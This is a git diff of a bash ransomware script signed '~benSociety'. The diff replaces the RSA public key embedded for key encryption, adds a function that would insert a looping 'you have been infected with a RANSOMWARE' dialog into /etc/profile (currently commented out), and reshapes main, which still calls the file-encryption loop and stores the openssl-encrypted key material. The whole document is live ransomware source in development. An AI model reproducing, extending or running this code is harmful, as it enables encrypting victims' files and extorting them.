@@ -70,13 +70,13 @@ init() {
 	KEY="$(openssl rand -base64 25)"
 	pubkey="\
 -----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzovHnKSF3X8bqSFLl4gB
-rCPrdg4iXYsS2GYxGGyft+AfCtUmUfBT7Bsi3vjRKgEqUuzjNJDjMjV5oZSX65z0
-4tG4nHr6dbhx/QqFGBXkL4IBHoxgCBCiFWq8HSNKV8A8yFJhZhX8yCyejKwb0trl
-vjrvvf9kQCMyvV+xb0m6I+Omwixyh6MEVy323GTGcDvvILRWrne40yzf3O0Xk8Ty
-1eiYBi7wbTjZcS2oUe+5Pe+YutuCkoRwFjZXVB4j0i75g+sx+2UDbUfefhnH49gC
-3LysGPZqijn/c9Gm3LBN9r7mrybZA/6zt9TvJnfhauWoRfPTZFDnCAvm0mjGjaLU
-nwIDAQAB
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtXODFFedTcvdzqPtbxpE
+Xsc0vlXdXRkR4sjnPJ6eycA7ILQG+/ZYocSDTmxSoRFvtqq8AQ5BCJEcl6rTp9JJ
+d8PBVGfz4sR7YRR6jjVEfy9n0EUua5EcX8ST1gOsIiyqZPbvCab05AUK+u8Yvyiq
+5PA7IcZdIR1LwG6/NAZ0+Kh5iJeHmJP6H7hp1UxY2Qk2SuhyDRTUWgWM8PBxKny5
+GkgnPhkquGXUWYtXyhoW3JlOxIVSml9g6jrtivINJpSESSMpgdt3WjPD1oU6H/ts
+hD6EWJStqoDSp83199vc5+7lVV5pouDDf4q178lIYlfagwX5IdaWSgcKUXrRpd6Q
+CwIDAQAB
 -----END PUBLIC KEY-----\
 	"
 	PUBLICKEY="publickey.txt"
@@ -153,7 +153,27 @@ dec_loop() {
     done
 }
 ################# MAIN ######################################
+setmsg() {
+    msg="while [ \"\$x\" != '10' ]; do $DIALOG --title 'Oops...' --msgbox 'Congratulations,\\\\n\\\\nYou have been infected with a RANSOMWARE!!!!!\\\\nI know. Scary stuff.\\\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\\\n\\\\nLove,\\\\n\\\\n~benSociety' 20 30;if [ \"\$?\" == 255 ]; then x=\$((x+1));fi; done"
+
+    if [ "`which sed`" != "" ]; then
+    	echo sed exists
+        #sed "1s/^/$msg\n\n/" /etc/profile
+    else
+        echo "sed isnt there :("
+        #echo $msg > /etc/profile
+    fi
+}
+
+lock() {
+    :
+}
+
+
 main() {
+    check_msg
+    setmsg
+    exit
     trap '' INT
     trap '' TERM
     #SOFT="YES"
@@ -163,10 +183,6 @@ main() {
     enc_loop "$targets"
     echo >> $PRIVATEKEY
     printf "$LIST" | openssl aes-256-cbc -k "$KEY" | openssl base64 >> $PRIVATEKEY
-    message="Congratulations,\n\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\n\nLove,\n\n~benSociety"
-    title="Oops.."
-    showmess "$title" "$message"
-    #dec_loop "$targets"
 EXIT
 }
 main
